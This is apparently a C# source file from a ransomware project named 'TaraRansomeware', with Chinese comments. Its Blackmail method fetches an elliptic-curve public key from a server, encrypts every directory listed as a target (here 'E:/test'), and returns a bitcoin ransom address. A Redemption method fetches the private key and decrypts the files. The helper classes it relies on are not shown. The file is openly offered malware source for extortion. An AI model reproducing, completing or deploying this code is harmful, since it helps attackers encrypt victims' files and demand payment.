using Org.BouncyCastle.Crypto.Digests;
using Org.BouncyCastle.Utilities.Encoders;
using System.Threading.Tasks;
using TaraRansomeware.Engines;
using TaraRansomeware.Utilities;

namespace TaraRansomeware
{
    internal class Ransomeware
    {
        /// <summary>
        /// 获取机器的唯一识别码
        /// </summary>
        private static readonly byte[] guid = GuidGenerator.getHash(new Sha256Digest());

        /// <summary>
        /// 需要进行感染的目录根
        /// </summary>
        private static string[] rootdir = { "E:/test" };

        /// <summary>
        /// 文件处理器
        /// </summary>
        private static FileProcessEngine processor = new FileProcessEngine(guid);

        /// <summary>
        /// 触发勒索
        /// </summary>
        /// <returns>付款的比特币地址</returns>
        public static string Blackmail()
        {
            var cipPubKey = KeyUtils.DecodeECPublicKey(Hex.Decode(
                Task.Run(() => HttpUtils.httpreq(guid, HttpUtils.PostAction.Blackmail)).Result
            ));

            foreach (string dir in rootdir)
            {
                processor.EncryptDirectory(cipPubKey, dir);
            }

            return Task.Run(() => HttpUtils.httpreq(guid, HttpUtils.PostAction.Redemption)).Result;
        }

        /// <summary>
        /// 触发赎回
        /// </summary>
        public static void Redemption()
        {
            var cipPrivKey = KeyUtils.DecodeECPrivateKey(Hex.Decode(
                Task.Run(() => HttpUtils.httpreq(guid, HttpUtils.PostAction.Redemption)).Result
            ));

            foreach (string dir in rootdir)
            {
                processor.DecryptDirectory(cipPrivKey, dir);
            }
        }

    }
}
